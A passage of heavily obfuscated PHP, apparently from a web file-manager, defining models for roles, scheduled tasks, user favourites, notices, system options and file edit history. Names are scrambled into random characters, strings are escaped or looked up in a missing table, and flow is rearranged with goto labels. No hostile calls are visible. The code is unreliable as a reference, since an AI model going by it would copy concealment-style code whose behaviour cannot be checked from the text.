isset($_REQUEST[$˜›•÷Ùˆ[313]]) ? json_decode($_REQUEST[$˜›•÷Ùˆ[313]], !0) : !1; $ûë‘Şùñ = $éÀ×—“š && _get($éÀ×—“š, $˜›•÷Ùˆ[314]) == $˜›•÷Ùˆ[315]; } return $ûë‘Şùñ; } public function getHost() { $¶áÀÏª¥ =& $_SERVER[¬ÏÕ§Áú]; $¡ã¨Úîô = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¶áÀÏª¥[80], $¶áÀÏª¥[74], $¶áÀÏª¥[79], $¶áÀÏª¥[72]))) { return $¡ã¨Úîô . $¶áÀÏª¥[8] . $this->bucket; } if ($this->osType == $¶áÀÏª¥[72] && !is_domain($¡ã¨Úîô)) { return $¡ã¨Úîô . $¶áÀÏª¥[8] . $this->bucket; } $¡ã¨Úîô = explode($¶áÀÏª¥[221], $¡ã¨Úîô); return $¡ã¨Úîô[0] . $¶áÀÏª¥[221] . $this->bucket . $¶áÀÏª¥[10] . $¡ã¨Úîô[1]; } public function size($“ÌêÜ”‰) { $ŞÒˆê¾ê = $this->objectMeta($“ÌêÜ”‰); return $ŞÒˆê¾ê ? $ŞÒˆê¾ê[$_SERVER[¬ÏÕ§Áú][89]] : 0; } public function info($ªöÚ›Šº) { if ($this->isFolder($ªöÚ›Šº)) { return $this->folderInfo($ªöÚ›Šº); } else { if ($this->isFile($ªöÚ›Šº)) { return $this->fileInfo($ªöÚ›Šº); } } return !1; } public function exist($üâ«š™) { return $this->isFile($üâ«š™) || $this->isFolder($üâ«š™); } public function isFile($Ûì¿®´ª) { return !$this->isFolder($Ûì¿®´ª) && $this->objectMeta($Ûì¿®´ª); } public function isFolder($æ¾á’â¾) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][190], $æ¾á’â¾); } protected function objectMeta($»¼»äÙ†) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][192], $»¼»äÙ†); } protected function _objectMeta($¶æë³¬Ò) { $äóû¹ô¹ =& $_SERVER[¬ÏÕ§Áú]; $¶æë³¬Ò = rtrim($¶æë³¬Ò, $äóû¹ô¹[8]); try { $ıú´ï´¼ = $this->client->getObjectInfo($this->bucket, $¶æë³¬Ò); if (!isset($ıú´ï´¼[$äóû¹ô¹[265]]) && isset($ıú´ï´¼[$äóû¹ô¹[316]])) { $ıú´ï´¼[$äóû¹ô¹[265]] = $ıú´ï´¼[$äóû¹ô¹[316]]; } } catch (Exception $‚¢¡¯“÷) { $ıú´ï´¼ = !1; } if (!$ıú´ï´¼) { } return $ıú´ï´¼; } protected function _isFolder($ë©‚à¤Ä) { $ÄüÊüÊ§ =& $_SERVER[¬ÏÕ§Áú]; $ë©‚à¤Ä = rtrim($ë©‚à¤Ä, $ÄüÊüÊ§[8]) . $ÄüÊüÊ§[8]; if ($ë©‚à¤Ä == $ÄüÊüÊ§[12] || $ë©‚à¤Ä == $ÄüÊüÊ§[8]) { return !0; } $»¶ØÊú€ = $this->client->getBucket($this->bucket, $ë©‚à¤Ä, null, 1); if (empty($»¶ØÊú€[$ÄüÊüÊ§[249]])) { return !1; } $®¸¯–ìˆ = $»¶ØÊú€[$ÄüÊüÊ§[249]][0][$ÄüÊüÊ§[32]]; return stripos($®¸¯–ìˆ, $ë©‚à¤Ä) === 0 ? !0 : !1; if (substr($®¸¯–ìˆ, -1) == $ÄüÊüÊ§[8]) { return !0; } if (get_path_this($®¸¯–ìˆ) == get_path_this($ë©‚à¤Ä)) { return !1; } return !0; } public function listObject($«ÛèÇôŠ) { return $this->fileList($«ÛèÇôŠ, $_SERVER[¬ÏÕ§Áú][12], !0); } } goto cÂçé®º; dËµŸØ÷‚Ú: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\x72\x6f\x6c\145\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x61\x75\x74\x68", "\x6c\x61\x62\x65\x6c", "\x64\x69\163\160\154\x61\171", "\x73\x79\163\164\x65\x6d", "\144\145\x73\x63", "\x69\147\156\157\x72\145\105\170\164", "\x69\x67\x6e\x6f\x72\x65\x46\x69\x6c\x65\x53\151\x7a\145", "\141\144\155\x69\x6e\151\163\164\162\x61\x74\157\x72", "\x73\157\162\x74"); public function listData($ˆ ¬‹Œä = false, $í–“¬ = "\x73\157\x72\164", $ø¿½ç©È = false) { $Î««Ô²× =& $_SERVER[¬ÏÕ§Áú]; $±»¸òäÃ = parent::listData($ˆ ¬‹Œä, $í–“¬, $ø¿½ç©È); if (!$ˆ ¬‹Œä) { foreach ($±»¸òäÃ as $â†ºÕø => $«‹ƒ©áª) { if ($«‹ƒ©áª[$Î««Ô²×[2239]] == 1) { $±»¸òäÃ[$â†ºÕø][$Î««Ô²×[545]] = LNG($Î««Ô²×[2534]); } } } return $±»¸òäÃ; } public function update($ß’ÊŒ—Á, $³Ü¬ˆüß) { $òœÓè § =& $_SERVER[¬ÏÕ§Áú]; $ìÊ‚¦† = parent::listData($ß’ÊŒ—Á); $•“ü«²Å = $this->findByName($³Ü¬ˆüß[$òœÓè §[32]]); if (!$ìÊ‚¦† || $•“ü«²Å && $•“ü«²Å[$òœÓè §[492]] != $ìÊ‚¦†[$òœÓè §[492]]) { return !1; } if ($•“ü«²Å[$òœÓè §[2239]] == 1) { $³Ü¬ˆüß = array($òœÓè §[32] => $³Ü¬ˆüß[$òœÓè §[32]], $òœÓè §[2060] => $³Ü¬ˆüß[$òœÓè §[2060]]); } $this->filterAuth($³Ü¬ˆüß[$òœÓè §[507]]); return parent::update($ß’ÊŒ—Á, $³Ü¬ˆüß); } public function remove($·¯ÕÙÙÕ) { $ï±èë¤° = parent::listData($·¯ÕÙÙÕ); if (!$ï±èë¤° || $ï±èë¤°[$_SERVER[¬ÏÕ§Áú][202]]) { return !1; } return parent::remove($·¯ÕÙÙÕ); } public function add($è¢š•°ú) { $£¥óİ­ =& $_SERVER[¬ÏÕ§Áú]; $ôÖ«ÙÙÆ = $è¢š•°ú[$£¥óİ­[32]]; if ($this->findByName($ôÖ«ÙÙÆ)) { return !1; } $ÊõÎ¤ô¤ = array($£¥óİ­[514] => $ôÖ«ÙÙÆ, $£¥óİ­[2043] => $£¥óİ­[12], $£¥óİ­[2039] => $£¥óİ­[2047], $£¥óİ­[2535] => 1, $£¥óİ­[2042] => 0, $£¥óİ­[2536] => 0, $£¥óİ­[2041] => $this->getSort()); $è¢š•°ú = array_merge($ÊõÎ¤ô¤, $è¢š•°ú); $this->filterAuth($è¢š•°ú[$£¥óİ­[507]]); return parent::insert($è¢š•°ú); } private function getSort() { $ƒ“Ç¦ßú =& $_SERVER[¬ÏÕ§Áú]; $Î§º¡’ = parent::listData(); $àòíÙª = array_to_keyvalue($Î§º¡’, $ƒ“Ç¦ßú[12], $ƒ“Ç¦ßú[2061]); return empty($àòíÙª) ? 0 : max($àòíÙª) + 1; } private function filterAuth(&$š¬„ˆî) { $¸£ó½ê =& $_SERVER[¬ÏÕ§Áú]; $İıäŸŒ¤ = array(); $ù÷£Õ’˜ = array_filter(explode($¸£ó½ê[50], $š¬„ˆî)); foreach ($ù÷£Õ’˜ as $š¬„ˆî) { $­Ê“ø·Ö = explode($¸£ó½ê[10], $š¬„ˆî); if ($­Ê“ø·Ö[0] == $¸£ó½ê[2537] && $­Ê“ø·Ö[1] != $¸£ó½ê[1330]) { $××»Ö±˜ = $­Ê“ø·Ö[0] . $¸£ó½ê[10] . $­Ê“ø·Ö[1] . $¸£ó½ê[2538]; if (!in_array($××»Ö±˜, $ù÷£Õ’˜)) { $İıäŸŒ¤[] = $××»Ö±˜; } } $İıäŸŒ¤[] = $š¬„ˆî; } $š¬„ˆî = implode($¸£ó½ê[50], $İıäŸŒ¤); } public function findRoleDefault() { $ñÕíöÀŠ =& $_SERVER[¬ÏÕ§Áú]; $òûû®å– = parent::listData(); $²‰ïú¦ = !1; foreach ($òûû®å– as $íø¨—²¸) { if (!$íø¨—²¸ || $íø¨—²¸[$ñÕíöÀŠ[2059]] == $ñÕíöÀŠ[241] || $íø¨—²¸[$ñÕíöÀŠ[2239]] == 1) { continue; } if (strstr($íø¨—²¸[$ñÕíöÀŠ[507]], $ñÕíöÀŠ[2539])) { continue; } if (!strstr($íø¨—²¸[$ñÕíöÀŠ[507]], $ñÕíöÀŠ[2540])) { continue; } if (!$²‰ïú¦) { $²‰ïú¦ = $íø¨—²¸; continue; } $ÒÊ¶´ = explode($ñÕíöÀŠ[50], $²‰ïú¦[$ñÕíöÀŠ[507]]); $œš¼Ö‘ = explode($ñÕíöÀŠ[50], $íø¨—²¸[$ñÕíöÀŠ[507]]); if (count($ÒÊ¶´) > count($œš¼Ö‘)) { $²‰ïú¦ = $íø¨—²¸; } } return $²‰ïú¦ ? $²‰ïú¦[$ñÕíöÀŠ[492]] : $ñÕíöÀŠ[12]; } public function sort($ğ¾Óúƒ, $á­èîÂ) { return parent::update($ğ¾Óúƒ, $á­èîÂ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\x74\141\x73\x6b\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\145", "\x74\x79\x70\x65", "\145\x76\145\x6e\x74", "\164\x69\x6d\x65", "\x64\145\x73\143", "\x73\171\163\x74\x65\x6d", "\x65\156\x61\142\x6c\145", "\x6c\x61\163\164\x52\x75\x6e", "\x73\x6f\162\x74"); public function listData($åˆ´Šïé = false, $†´æ—ó‡ = "\x73\x6f\162\164", $û® ø©Ï = false) { return parent::listData($åˆ´Šïé, $†´æ—ó‡, $û® ø©Ï); } public function add($ğ¬şû¾¿) { $İá¨Ï¨ˆ =& $_SERVER[¬ÏÕ§Áú]; $äõæ„Ø‘ = $this->findByName($ğ¬şû¾¿[$İá¨Ï¨ˆ[32]]); if ($äõæ„Ø‘) { return !1; } $ğ¬şû¾¿[$İá¨Ï¨ˆ[1787]] = 0; $ğ¬şû¾¿[$İá¨Ï¨ˆ[2061]] = $this->getSort(); return parent::insert($ğ¬şû¾¿); } private function getSort() { $ëÀ¸œõ =& $_SERVER[¬ÏÕ§Áú]; $ãœ®‘Ñ¦ = parent::listData(); $³¸¢Âó = array_to_keyvalue($ãœ®‘Ñ¦, $ëÀ¸œõ[12], $ëÀ¸œõ[2061]); return empty($³¸¢Âó) ? 0 : max($³¸¢Âó) + 1; } public function update($¤¥ëÜä‰, $à§‚”¹õ) { $Ÿà«ƒ‘ =& $_SERVER[¬ÏÕ§Áú]; $ÕßÓ¯Ù = $this->listData($¤¥ëÜä‰); $ß½ÊÈ™ = $this->findByName($à§‚”¹õ[$Ÿà«ƒ‘[32]]); if (!$ÕßÓ¯Ù || $ß½ÊÈ™ && $ß½ÊÈ™[$Ÿà«ƒ‘[492]] != $ÕßÓ¯Ù[$Ÿà«ƒ‘[492]]) { return !1; } return parent::update($¤¥ëÜä‰, $à§‚”¹õ); } public function remove($Î±¾„ş, $ŸëÍÀ£ï = false) { $šÜ’ÑØ§ =& $_SERVER[¬ÏÕ§Áú]; $ êÃ´İÂ = $this->listData($Î±¾„ş); if (!$ êÃ´İÂ) { return; } if (!$ŸëÍÀ£ï && $ êÃ´İÂ[$šÜ’ÑØ§[202]] == $šÜ’ÑØ§[101]) { return !1; } return parent::remove($Î±¾„ş); } public function enable($¼¢Øšø¬, $œÙ…–Ø) { return $this->update($¼¢Øšø¬, array($_SERVER[¬ÏÕ§Áú][2529] => $œÙ…–Ø)); } public function run($ÎÌ•òŞõ) { return $this->update($ÎÌ•òŞõ, array($_SERVER[¬ÏÕ§Áú][2541] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($ºã›ò·) { $›öÈñÚ =& $_SERVER[¬ÏÕ§Áú]; return array($›öÈñÚ[2152] => array(USER_ID, $›öÈñÚ[2542])); } protected function listData() { $ƒ˜Øø‹Õ =& $_SERVER[¬ÏÕ§Áú]; $á§áÌ¨  = array($ƒ˜Øø‹Õ[1828] => USER_ID, $ƒ˜Øø‹Õ[578] => 0); $œğ÷Ëèô = $ƒ˜Øø‹Õ[2543]; $ä’‡Î­ = $this->field($œğ÷Ëèô)->where($á§áÌ¨ )->order($ƒ˜Øø‹Õ[2544])->select(); return $ä’‡Î­ ? $ä’‡Î­ : array(); } protected function resetCache() { } protected function listView() { $Öú­¨Õó =& $_SERVER[¬ÏÕ§Áú]; $Ôì¶‘ö² = $this->listData(); $øæ¿Ä“Õ = array_filter_by_field($Ôì¶‘ö², $Öú­¨Õó[33], $Öú­¨Õó[510]); $­¼÷ıçÚ = array_to_keyvalue($øæ¿Ä“Õ, $Öú­¨Õó[12], $Öú­¨Õó[97]); if (!$­¼÷ıçÚ) { return $Ôì¶‘ö²; } $ÛÁâ±øÖ = 2000; $Ş­ÜâÌú = array($Öú­¨Õó[511] => array($Öú­¨Õó[512], $­¼÷ıçÚ)); $Û¨Ğ¬ºÅ = Model($Öú­¨Õó[946])->listSource($Ş­ÜâÌú, $ÛÁâ±øÖ); $Û¨Ğ¬ºÅ = array_merge($Û¨Ğ¬ºÅ[$Öú­¨Õó[96]], $Û¨Ğ¬ºÅ[$Öú­¨Õó[95]]); $Û¨Ğ¬ºÅ = array_to_keyvalue($Û¨Ğ¬ºÅ, $Öú­¨Õó[204]); foreach ($Ôì¶‘ö² as $€Ë“Øİ… => $¼ùÆ»ºÑ) { $šíëçÊ¤ = $Û¨Ğ¬ºÅ[$¼ùÆ»ºÑ[$Öú­¨Õó[97]]]; $šíëçÊ¤ = $šíëçÊ¤ ? $šíëçÊ¤ : array(); $Ôì¶‘ö²[$€Ë“Øİ…] = array_merge($šíëçÊ¤, $¼ùÆ»ºÑ); } return $Ôì¶‘ö²; } protected function addFav($”ı¸•Ã, $«Ø¼òşŠ = '', $ĞÛÇã£ = "\x73\x6f\165\x72\143\145") { $ŠÑ¨Ùœœ =& $_SERVER[¬ÏÕ§Áú]; $œ±¢ªé = array($ŠÑ¨Ùœœ[1828] => USER_ID, $ŠÑ¨Ùœœ[578] => 0, $ŠÑ¨Ùœœ[516] => $ĞÛÇã£, $ŠÑ¨Ùœœ[515] => $”ı¸•Ã); if ($this->where($œ±¢ªé)->find()) { return !1; } $œ±¢ªé = array($ŠÑ¨Ùœœ[1828] => USER_ID, $ŠÑ¨Ùœœ[578] => 0); $éÌÉÌó = $this->where($œ±¢ªé)->max($ŠÑ¨Ùœœ[2061]); if (!$éÌÉÌó) { $éÌÉÌó = 0; } if (!$«Ø¼òşŠ && $ĞÛÇã£ == $ŠÑ¨Ùœœ[510]) { $Ú›ûÉığ = Model($ŠÑ¨Ùœœ[1483])->where(array($ŠÑ¨Ùœœ[511] => $”ı¸•Ã))->find(); if (!$Ú›ûÉığ) { return !1; } $«Ø¼òşŠ = $Ú›ûÉığ[$ŠÑ¨Ùœœ[32]]; } $«Ø¼òşŠ = $this->getAutoName($«Ø¼òşŠ); $Ü‰î¹¥Ğ = array($ŠÑ¨Ùœœ[1828] => USER_ID, $ŠÑ¨Ùœœ[578] => 0, $ŠÑ¨Ùœœ[514] => $«Ø¼òşŠ, $ŠÑ¨Ùœœ[515] => $”ı¸•Ã, $ŠÑ¨Ùœœ[516] => $ĞÛÇã£, $ŠÑ¨Ùœœ[2041] => $éÌÉÌó + 1); return $this->add($Ü‰î¹¥Ğ); } protected function remove($™×ÙïÈ) { $ÆÏ‰øÎ¡ =& $_SERVER[¬ÏÕ§Áú]; $æÆ¬²Šú = array($ÆÏ‰øÎ¡[1828] => USER_ID, $ÆÏ‰øÎ¡[513] => $™×ÙïÈ); return $this->where($æÆ¬²Šú)->delete(); } protected function removeByName($û»ûëÂ¡) { $‘ãÊóı÷ =& $_SERVER[¬ÏÕ§Áú]; $”üû–ÄÅ = array($‘ãÊóı÷[1828] => USER_ID, $‘ãÊóı÷[514] => $û»ûëÂ¡, $‘ãÊóı÷[578] => 0); return $this->where($”üû–ÄÅ)->delete(); } protected function rename($†ÔÓ— “, $üÚü›ú) { $¡›•¦ =& $_SERVER[¬ÏÕ§Áú]; if ($†ÔÓ— “ == $üÚü›ú) { return !1; } $Ë¾©ø”‹ = $this->getAutoName($üÚü›ú); if ($üÚü›ú != $Ë¾©ø”‹) { return !1; } $ÈÔÌ€® = array($¡›•¦[1828] => USER_ID, $¡›•¦[578] => 0, $¡›•¦[32] => $†ÔÓ— “); return $this->where($ÈÔÌ€®)->save(array($¡›•¦[32] => $üÚü›ú)); } protected function resetSort($òÍ†) { $³ªÂˆïó =& $_SERVER[¬ÏÕ§Áú]; $òÍ† = is_array($òÍ†) ? $òÍ† : array(); $¿Œİªñ± = array($³ªÂˆïó[1828] => USER_ID); for ($®ÀĞ¶ô… = 0; $®ÀĞ¶ô… < count($òÍ†); $®ÀĞ¶ô…++) { $¿Œİªñ±[$³ªÂˆïó[513]] = $òÍ†[$®ÀĞ¶ô…]; $this->where($¿Œİªñ±)->save(array($³ªÂˆïó[2041] => $®ÀĞ¶ô… + 1)); } return !0; } protected function moveTop($çûÓÎô) { $èœÒäÁí =& $_SERVER[¬ÏÕ§Áú]; $Êè½ÀĞĞ = array($èœÒäÁí[1828] => USER_ID, $èœÒäÁí[578] => 0); $‡ãé®Ôé = $this->where($Êè½ÀĞĞ)->where(array($èœÒäÁí[32] => $çûÓÎô))->find(); if (!$‡ãé®Ôé) { return; } $Öşâ±Šî = $this->field($èœÒäÁí[492])->where($Êè½ÀĞĞ)->order($èœÒäÁí[2544])->select(); $Öşâ±Šî = array_to_keyvalue($Öşâ±Šî, $èœÒäÁí[12], $èœÒäÁí[492]); $¯‡àº‘õ = $Öşâ±Šî; $Öşâ±Šî = array_remove_value($Öşâ±Šî, $‡ãé®Ôé[$èœÒäÁí[492]]); array_unshift($Öşâ±Šî, $‡ãé®Ôé[$èœÒäÁí[492]]); return $this->resetSort($Öşâ±Šî); } protected function moveBottom($ûóÓØß¨) { $š•øŒÏº =& $_SERVER[¬ÏÕ§Áú]; $ßõ¤Ğ‚‚ = array($š•øŒÏº[1828] => USER_ID, $š•øŒÏº[578] => 0); $æú¼É–§ = $this->where($ßõ¤Ğ‚‚)->max($š•øŒÏº[2061]); $Ì‹üó§¯ = array($š•øŒÏº[2061] => $æú¼É–§ + 1); return $this->where($ßõ¤Ğ‚‚)->where(array($š•øŒÏº[32] => $ûóÓØß¨))->save($Ì‹üó§¯); } private function getAutoName($¹íê¼¬) { $…Ö…Ö¤ =& $_SERVER[¬ÏÕ§Áú]; $ÇƒÈü = array($…Ö…Ö¤[1828] => USER_ID, $…Ö…Ö¤[578] => 0); $Ş“”í¥¶ = $this->field($…Ö…Ö¤[32])->where($ÇƒÈü)->select(); $Ş“”í¥¶ = array_to_keyvalue($Ş“”í¥¶, $…Ö…Ö¤[12], $…Ö…Ö¤[32]); if (!$Ş“”í¥¶ || !in_array($¹íê¼¬, $Ş“”í¥¶)) { return $¹íê¼¬; } for ($â‚Ç‰È = 0; $â‚Ç‰È < count($Ş“”í¥¶); $â‚Ç‰È++) { if (!in_array($¹íê¼¬ . "\50{$â‚Ç‰È}\x29", $Ş“”í¥¶)) { return $¹íê¼¬ . "\50{$â‚Ç‰È}\51"; } } return $¹íê¼¬ . "\x28{$â‚Ç‰È}\x29"; } } goto cÈàëó¡ ´; bÏÎá‘¡Èï: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\156\157\164\x69\x63\x65\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\x63\157\x6e\x74\x65\156\x74", "\141\x75\x74\x68", "\x6d\x6f\144\x65", "\164\x69\x6d\145", "\x74\171\x70\145", "\154\x65\x76\x65\x6c", "\145\x6e\x61\142\x6c\145", "\x73\x6f\162\x74"); public function listData($¤Øó = false, $÷ß‰•–Æ = "\163\x6f\162\164", $Üˆñ£­¸ = false) { return parent::listData($¤Øó, $÷ß‰•–Æ, $Üˆñ£­¸); } public function add($¶§ºÒíı) { $‚½æ¯µÂ =& $_SERVER[¬ÏÕ§Áú]; $Ã—å‹«Æ = time(); if ($¶§ºÒíı[$‚½æ¯µÂ[16]] == $‚½æ¯µÂ[2528]) { $Ã—å‹«Æ = strtotime($¶§ºÒíı[$‚½æ¯µÂ[217]]); } $¶§ºÒíı[$‚½æ¯µÂ[217]] = $Ã—å‹«Æ; return parent::insert($¶§ºÒíı); } public function update($Â¤¾£ÀÒ, $ÉŠŒœó§) { $İ»Ğíú’ =& $_SERVER[¬ÏÕ§Áú]; $Í»†Ìì¤ = $this->listData($Â¤¾£ÀÒ); if (!$Í»†Ìì¤) { return !1; } $ĞÖ¥ëÈ´ = time(); if ($ÉŠŒœó§[$İ»Ğíú’[16]] == $İ»Ğíú’[2528]) { $ĞÖ¥ëÈ´ = strtotime($ÉŠŒœó§[$İ»Ğíú’[217]]); } $ÉŠŒœó§[$İ»Ğíú’[217]] = $ĞÖ¥ëÈ´; return parent::update($Â¤¾£ÀÒ, $ÉŠŒœó§); } public function remove($ŠÉ‹¹Õ·) { $èËÎ•Óº = $this->listData($ŠÉ‹¹Õ·); if (!$èËÎ•Óº || $èËÎ•Óº[$_SERVER[¬ÏÕ§Áú][202]]) { return !1; } return parent::remove($ŠÉ‹¹Õ·); } public function sort($êü·›Ã, $ÆÀ›‹¦è) { return parent::update($êü·›Ã, $ÆÀ›‹¦è); } public function enable($Æéè¯‰‚, $ô”İÎ¬Â) { return parent::update($Æéè¯‰‚, array($_SERVER[¬ÏÕ§Áú][2529] => $ô”İÎ¬Â)); } private function initUserOption() { $ÜÅŸÆŒƒ =& $_SERVER[¬ÏÕ§Áú]; $this->optionType = $ÜÅŸÆŒƒ[2530]; $this->modelType = $ÜÅŸÆŒƒ[2531]; $this->field = array($ÜÅŸÆŒƒ[2532], $ÜÅŸÆŒƒ[32], $ÜÅŸÆŒƒ[217], $ÜÅŸÆŒƒ[33], $ÜÅŸÆŒƒ[2533], $ÜÅŸÆŒƒ[863], $ÜÅŸÆŒƒ[239]); } public function userNoticeGet($‘©¨ˆ‰Á = false) { $this->initUserOption(); return parent::listData($‘©¨ˆ‰Á, $_SERVER[¬ÏÕ§Áú][492], !0); } public function userNoticeAdd($ ©¿¾š) { $Ó‹Ğ’Ëã =& $_SERVER[¬ÏÕ§Áú]; $this->initUserOption(); $¶½ÎõÁü = $this->findByKey($Ó‹Ğ’Ëã[2532], $ ©¿¾š[$Ó‹Ğ’Ëã[492]]); if ($¶½ÎõÁü) { return !0; } $˜ İ›åª = array($Ó‹Ğ’Ëã[2532] => $ ©¿¾š[$Ó‹Ğ’Ëã[492]], $Ó‹Ğ’Ëã[32] => $ ©¿¾š[$Ó‹Ğ’Ëã[32]], $Ó‹Ğ’Ëã[217] => $ ©¿¾š[$Ó‹Ğ’Ëã[217]], $Ó‹Ğ’Ëã[33] => isset($ ©¿¾š[$Ó‹Ğ’Ëã[33]]) ? $ ©¿¾š[$Ó‹Ğ’Ëã[33]] : 1, $Ó‹Ğ’Ëã[2533] => isset($ ©¿¾š[$Ó‹Ğ’Ëã[2533]]) ? $ ©¿¾š[$Ó‹Ğ’Ëã[2533]] : 0, $Ó‹Ğ’Ëã[863] => 0, $Ó‹Ğ’Ëã[239] => 0); return parent::insert($˜ İ›åª); } public function userNoticeEdit($û¬è¡, $ƒü—§º¤) { $this->initUserOption(); return parent::update($û¬è¡, $ƒü—§º¤); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\x6d\x5f\x6f\160\164\151\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\162\x6f\x6c\145", "\162\x6f\x6c\x65\x47\x72\157\165\x70", "\162\x65\147\x69\x73\164", "\145\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($·›©¿½²) { return "\123\x79\163\164\x65\155\117\160\x74\151\157\156\x5f{$·›©¿½²}"; } protected function optionDefault($ğâôöï = '') { $è­ùÑİİ =& $_SERVER[¬ÏÕ§Áú]; if ($ğâôöï == $è­ùÑİİ[12]) { return $GLOBALS[$è­ùÑİİ[6]][$è­ùÑİİ[477]]; } } } class SystemRecordModel extends ModelBaseLight { } goto dËµŸØ÷‚Ú; aŸÚŞğœ‚: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\x63\x65\137\x68\151\x73\x74\157\162\x79"; public function historyCount($ÆúĞ¹†¸) { $áÙÀü„Á =& $_SERVER[¬ÏÕ§Áú]; if (!$ÆúĞ¹†¸) { return array(); } if (is_string($ÆúĞ¹†¸) || is_int($ÆúĞ¹†¸)) { $ÆúĞ¹†¸ = array($ÆúĞ¹†¸); } $Ò¬Æò¨é = array($áÙÀü„Á[204], $áÙÀü„Á[2299] => $áÙÀü„Á[586]); $Š”àùˆ‰ = array($áÙÀü„Á[204] => array($áÙÀü„Á[7], $ÆúĞ¹†¸)); $ô˜ªáÖÃ = $this->field($Ò¬Æò¨é)->where($Š”àùˆ‰)->group($áÙÀü„Á[204])->select(); return array_to_keyvalue($ô˜ªáÖÃ, $áÙÀü„Á[204], $áÙÀü„Á[586]); } public function addHistory($î»Õ™–Š, $ÈÁé = '') { $Ó‘İà£Ì =& $_SERVER[¬ÏÕ§Áú]; $®Èë€òÉ = array($Ó‘İà£Ì[511] => $î»Õ™–Š[$Ó‘İà£Ì[204]], $Ó‘İà£Ì[1828] => isset($î»Õ™–Š[$Ó‘İà£Ì[548]]) ? $î»Õ™–Š[$Ó‘İà£Ì[548]] : $î»Õ™–Š[$Ó‘İà£Ì[546]], $Ó‘İà£Ì[563] => $î»Õ™–Š[$Ó‘İà£Ì[562]], $Ó‘İà£Ì[641] => $î»Õ™–Š[$Ó‘İà£Ì[89]], $Ó‘İà£Ì[2300] => $ÈÁé); if ($GLOBALS[$Ó‘İà£Ì[6]][$Ó‘İà£Ì[102]][$Ó‘İà£Ì[1357]] >= 1) { $this->historyAutoClear($®Èë€òÉ[$Ó‘İà£Ì[204]]); $this->add($®Èë€òÉ); } Hook::trigger($Ó‘İà£Ì[2301], $®Èë€òÉ); Model($Ó‘İà£Ì[2302])->eventFileEdit($î»Õ™–Š[$Ó‘İà£Ì[204]]); } private function historyAutoClear($À½©”¸¯) { $º®È†Èø =& $_SERVER[¬ÏÕ§Áú]; $²õı­· = Model($º®È†Èø[886])->get($º®È†Èø[1379]); $à…¦Š”à = intval($GLOBALS[$º®È†Èø[6]][$º®È†Èø[102]][$º®È†Èø[1357]]); $Á’ã¸õš = $²õı­· == $º®È†Èø[1380] ? min(5, $à…¦Š”à) : $à…¦Š”à; $Á’ã¸õš = $Á’ã¸õš <= 0 ? 0 : $Á’ã¸õš - 1; if ($Á’ã¸õš >= 499) { return; } $‡ÉŠÆ›… = array($º®È†Èø[511] => $À½©”¸¯); $¢™äµúç = $this->field($º®È†Èø[2303])->where($‡ÉŠÆ›…)->order($º®È†Èø[2296])->select(); if (!$¢™äµúç || $Á’ã¸õš >= count($¢™äµúç)) { return; } $Š©ó òá = array_to_keyvalue($¢™äµúç, $º®È†Èø[12], $º®È†Èø[492]); $Š©ó òá = array_slice($Š©ó òá, $Á’ã¸õš); $ƒŞ›ıëã = array_to_keyvalue($¢™äµúç, $º®È†Èø[12], $º®È†Èø[562]); $ƒŞ›ıëã = array_slice($ƒŞ›ıëã, $Á’ã¸õš); if (!$Š©ó òá || !$ƒŞ›ıëã) { return; } $‡ÉŠÆ›… = array($º®È†Èø[513] => array($º®È†Èø[7], $Š©ó òá)); $this->where($‡ÉŠÆ›…)->delete(); Model($º®È†Èø[565])->remove($ƒŞ›ıëã); } public function listData($ï¦¸Å¬½) { $ç˜ş«·ß =& $_SERVER[¬ÏÕ§Áú]; $ ¯ÊÛÆÌ = array($ç˜ş«·ß[511] => $ï¦¸Å¬½); $ºá‰§±“ = $ç˜ş«·ß[2304]; $¸ÕÔõ = $this->field($ºá‰§±“)->where($ ¯ÊÛÆÌ)->order($ç˜ş«·ß[2296])->selectPage(); $this->_listAppendUser($¸ÕÔõ[$ç˜ş«·ß[456]]); $À®ˆ¬ê™ = Model($ç˜ş«·ß[886])->get($ç˜ş«·ß[1379]); $²Ë¿Ü÷± = 5; if ($À®ˆ¬ê™ == $ç˜ş«·ß[1380]) { $¸ÕÔõ[$ç˜ş«·ß[456]] = array_slice($¸ÕÔõ[$ç˜ş«·ß[456]], 0, $²Ë¿Ü÷±); $¸ÕÔõ[$ç˜ş«·ß[453]] = array($ç˜ş«·ß[2305] => 1, $ç˜ş«·ß[2306] => 20, $ç˜ş«·ß[2307] => 1, $ç˜ş«·ß[2308] => count($¸ÕÔõ[$ç˜ş«·ß[456]])); } return $¸ÕÔõ; } protected function _listAppendUser(&$¯ı— Óƒ) { $‚±Û»”º =& $_SERVER[¬ÏÕ§Áú]; $ĞºŒ¹¯Í = array_to_keyvalue($¯ı— Óƒ, $‚±Û»”º[12], $‚±Û»”º[1837]); $•Ë¦…¿Ì = Model($‚±Û»”º[618])->userListInfo($ĞºŒ¹¯Í); foreach ($¯ı— Óƒ as &$ñ’ó‚À¶) { $‡Æ¬Õ»Ï = $ñ’ó‚À¶[$‚±Û»”º[1837]]; $ñ’ó‚À¶[$‚±Û»”º[546]] = $•Ë¦…¿Ì[$‡Æ¬Õ»Ï] ? $•Ë¦…¿Ì[$‡Æ¬Õ»Ï] : !1; } unset($ñ’ó‚À¶); } public function fileInfo($Î¬Üşª, $ğá÷Æ¸ß = false) { $Ãè¡¶÷ =& $_SERVER[¬ÏÕ§Áú]; $äµ—è† = $this->tablePrefix; $ØÆØ¥œÛ = 